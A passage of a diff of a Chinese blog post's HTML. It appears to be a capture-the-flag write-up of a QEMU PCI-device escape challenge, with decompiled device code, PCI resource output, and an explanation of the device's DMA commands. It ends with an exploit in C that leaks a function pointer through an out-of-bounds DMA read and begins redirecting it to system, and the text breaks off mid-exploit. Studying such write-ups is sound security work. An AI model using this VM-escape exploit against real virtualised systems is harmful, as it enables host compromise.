class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">         (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">         <span class="number">469</span>,</span><br><span class="line">         <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  BYTE4(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">16</span>;</span><br><span class="line">  HIWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">255</span>;</span><br><span class="line">  v2[<span class="number">2</span>].type = (Type)pci_hitb_realize;</span><br><span class="line">  v2[<span class="number">2</span>].object_cast_cache[<span class="number">0</span>] = (<span class="keyword">const</span> <span class="keyword">char</span> *)pci_hitb_uninit;</span><br><span class="line">  LOWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">4660</span>;</span><br><span class="line">  WORD1(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">9011</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -335,7 +370,7 @@
 
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">                           <span class="number">469</span>,</span><br><span class="line">                           <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;revision = <span class="number">16</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  v2-&gt;realize = pci_hitb_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = pci_hitb_uninit;</span><br><span class="line">  v2-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  v2-&gt;device_id = <span class="number">0x2333</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>可以看到设备号device_id=0x2333，功能号vendor_id=0x1234</p>
+<p>可以看到设备号device_id&#x3D;0x2333，功能号vendor_id&#x3D;0x1234</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lspci -v</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls /sys/bus/pci/devices/0000\:00\:04.0/</span></span><br><span class="line">broken_parity_status      firmware_node             rescan</span><br><span class="line">class                     irq                       resource</span><br><span class="line">config                    local_cpulist             resource0</span><br><span class="line">consistent_dma_mask_bits  local_cpus                subsystem</span><br><span class="line">d3cold_allowed            modalias                  subsystem_device</span><br><span class="line">device                    msi_bus                   subsystem_vendor</span><br><span class="line">dma_mask_bits             numa_node                 uevent</span><br><span class="line">driver_override           power                     vendor</span><br><span class="line"><span class="built_in">enable</span>                    remove</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fea00000 0x00000000feafffff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
 
 <p>resource文件内容的格式为start end flag 。在resource0文件中，根据这里没有resource1文件或者根据flag最后一位为0可知存在一个MMIO的内存空间，地址为0xfea00000，大小为0x100000。</p>
@@ -364,11 +399,11 @@
 <p>同样需要满足<code>size == 4</code>，并且在部分操作还需要满足<code>(opaque-&gt;dma.cmd &amp; 1) == 0</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *cnt_low; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  cmd = opaque-&gt;dma.cmd;</span><br><span class="line">  <span class="keyword">if</span> ( (cmd &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (cmd &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(LODWORD(opaque-&gt;dma.src) - <span class="number">0x40000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (cmd &amp; <span class="number">4</span>) != <span class="number">0</span> )                     <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">        opaque-&gt;enc(v7, opaque-&gt;dma.cnt);</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 3</span></span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, <span class="number">1</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 1</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">uint8_t</span> *)&amp;opaque[<span class="number">-36</span>] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)opaque-&gt;dma.dst - <span class="number">2824</span>;</span><br><span class="line">      LODWORD(cnt_low) = (_DWORD)opaque + opaque-&gt;dma.dst - <span class="number">0x40000</span> + <span class="number">3000</span>;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, <span class="number">0</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        opaque-&gt;enc((<span class="keyword">char</span> *)v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cnt_low);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">      hitb_raise_irq(opaque, (<span class="keyword">uint32_t</span>)cnt_low);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这里就是回调函数了，在上面的<code>hitb_mmio_write</code>函数中，当满足<code>if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</code>就会调用了。而在这个函数中存在这样一个函数<code>cpu_physical_memory_rw</code>，这个函数在我翻看手册的时候还发现了其他类似的函数<code>cpu_physical_memory_read</code>、<code>cpu_physical_memory_write</code>所以可以猜测得到这个函数到底是干什么的。这个函数就是用于传递内容在物理地址和虚拟地址之间。<code>cpu_physical_memory_rw</code>函数的第一个参数时物理地址，虚拟地址需要通过读取/proc/$pid/pagemap转换为物理地址。</p>
+<p>这里就是回调函数了，在上面的<code>hitb_mmio_write</code>函数中，当满足<code>if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</code>就会调用了。而在这个函数中存在这样一个函数<code>cpu_physical_memory_rw</code>，这个函数在我翻看手册的时候还发现了其他类似的函数<code>cpu_physical_memory_read</code>、<code>cpu_physical_memory_write</code>所以可以猜测得到这个函数到底是干什么的。这个函数就是用于传递内容在物理地址和虚拟地址之间。<code>cpu_physical_memory_rw</code>函数的第一个参数时物理地址，虚拟地址需要通过读取&#x2F;proc&#x2F;$pid&#x2F;pagemap转换为物理地址。</p>
 <ol>
-<li> dma.cmd==7时，idx=dma.src-0x40000，addr = dma_buf[idx]，调用enc加密函数加密，并写入到dma.dst中</li>
-<li> dma.cmd==3时，idx=dma.src-0x40000，addr = dma_buf[idx]，写入到dma.dst中</li>
-<li> dma.cmd==1时，idx=dma.dst-0x40000,addr=dma_buf[idx]，将其写入到dma.src中（第二个参数可以通过调试得到其地址就是dma_buf[dma.dst-0x40000]</li>
+<li>dma.cmd&#x3D;&#x3D;7时，idx&#x3D;dma.src-0x40000，addr &#x3D; dma_buf[idx]，调用enc加密函数加密，并写入到dma.dst中</li>
+<li>dma.cmd&#x3D;&#x3D;3时，idx&#x3D;dma.src-0x40000，addr &#x3D; dma_buf[idx]，写入到dma.dst中</li>
+<li>dma.cmd&#x3D;&#x3D;1时，idx&#x3D;dma.dst-0x40000,addr&#x3D;dma_buf[idx]，将其写入到dma.src中（第二个参数可以通过调试得到其地址就是dma_buf[dma.dst-0x40000]</li>
 </ol>
 <p>这个程序的作用就显而易见，这里实现的是一个dma机制。DMA(Direct Memory Access，直接内存存取) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。DMA 传输将数据从一个地址空间复制到另外一个地址空间。当CPU 初始化这个传输动作，传输动作本身是由 DMA 控制器来实行和完成。</p>
 <p>即首先通过访问mmio地址与值（addr与value），在<code>hitb_mmio_write</code>函数中设置好dma中的相关值（src、dst以及cmd)。当需要dma传输数据时，设置addr为152，就会触发时钟中断，由另一个线程去处理时钟中断。时钟中断调用<code>hitb_dma_timer</code>，该函数根据<code>dma.cmd</code>的不同调用<code>cpu_physical_memory_rw</code>函数将数据从物理地址拷贝到<code>dma_buf</code>中或从<code>dma_buf</code>拷贝到物理地址中。</p>
@@ -377,21 +412,11 @@
 <p><strong>exp</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DMABASE 0x40000</span></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_src</span><span class="params">(<span class="keyword">uint32_t</span> src_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>, src_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_dst</span><span class="params">(<span class="keyword">uint32_t</span> dst_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>, dst_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_cmd</span><span class="params">(<span class="keyword">uint32_t</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x98</span>, cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, buf, len);</span><br><span class="line"></span><br><span class="line">    dma_set_src(phy_userbuf);</span><br><span class="line">    dma_set_dst(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line">    dma_do_cmd(<span class="number">0</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_read</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dma_set_dst(phy_userbuf);</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">2</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_enc</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">1</span> | <span class="number">4</span> | <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate DMA buffer and obtain its physical address</span></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to leak enc ptr</span></span><br><span class="line">    dma_do_read(<span class="number">0x1000</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> leak_enc = *(<span class="keyword">uint64_t</span> *)userbuf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leaking enc function: %p\n&quot;</span>, (<span class="keyword">void</span> *)leak_enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pro_base = leak_enc - <span class="number">0x283DD0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = pro_base + <span class="number">0x1FDB18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to overwrite enc ptr to system 